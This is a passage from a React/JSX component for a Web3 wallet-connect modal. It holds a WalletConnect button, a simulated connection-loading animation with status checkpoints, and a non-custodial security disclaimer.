                  </div>

                  {/* WalletConnect Registry options */}
                  <button
                    type="button"
                    onClick={() => handleConnectWalletInModal('WalletConnect')}
                    className="w-full text-center p-3.5 bg-gradient-to-r from-[#170C3B] to-[#120731] hover:from-[#221355] hover:to-[#190B44] border border-[#8247E5]/40 rounded-xl hover:border-[#8247E5] transition-all text-white font-bold text-xs cursor-pointer flex items-center justify-center space-x-1.5 uppercase font-display tracking-wider"
                  >
                    <span>🔗</span>
                    <span>Link WalletConnect Registry</span>
                  </button>
                </div>
              </div>
            ) : (
              <div className="py-8 text-center space-y-6 relative z-10">
                {/* Simulated Web3 Connection Loading Sequences */}
                <div className="flex items-center justify-center relative">
                  <span className="relative flex h-14 w-14">
                    {/* Pulsing ring */}
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#8247E5] opacity-40"></span>
                    <span className="relative inline-flex rounded-full h-14 w-14 bg-purple-brand/40 border border-[#8247E5] flex items-center justify-center">
                      <svg className="animate-spin h-6 w-6 text-white" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                    </span>
                  </span>
                </div>

                <div className="space-y-3 max-w-sm mx-auto">
                  <h4 className="font-display font-black tracking-wide text-white uppercase text-sm block">
                    Connecting to {modalWalletType} Client...
                  </h4>
                  <p className="text-xs text-purple-glow font-mono animate-pulse min-h-[40px] px-4">
                    {modalLoadingText}
                  </p>
                </div>

                {/* Status checkpoints */}
                <div className="flex items-center justify-center space-x-2 pt-2 text-[10px] font-mono uppercase text-gray-500">
                  <span className={`w-1.5 h-1.5 rounded-full ${modalLoadingStep >= 1 ? 'bg-emerald-400' : 'bg-gray-600'}`} />
                  <span>Hook</span>
                  <span className="text-purple-brand/40">•</span>
                  <span className={`w-1.5 h-1.5 rounded-full ${modalLoadingStep >= 2 ? 'bg-emerald-400' : 'bg-gray-600'}`} />
                  <span>Network</span>
                  <span className="text-purple-brand/40">•</span>
                  <span className={`w-1.5 h-1.5 rounded-full ${modalLoadingStep >= 3 ? 'bg-emerald-400' : 'bg-gray-600'}`} />
                  <span>Token Secure</span>
                  <span className="text-purple-brand/40">•</span>
                  <span className={`w-1.5 h-1.5 rounded-full ${modalLoadingStep >= 4 ? 'bg-emerald-400 animate-pulse' : 'bg-gray-600'}`} />
                  <span>Complete</span>
                </div>
              </div>
            )}

            {/* Disclaimer footer inside modal */}
            <div className="mt-6 pt-4 border-t border-purple-brand/25 text-[9px] text-[#9CA3AF] text-center font-sans tracking-wide leading-relaxed">
              Escrow integrations adhere to standard ERC-4337 non-custodial EVM interfaces. Your private keys never bypass security sandboxes.
            </div>

          </div>
        </div>
      )}

    </div>
  );
}
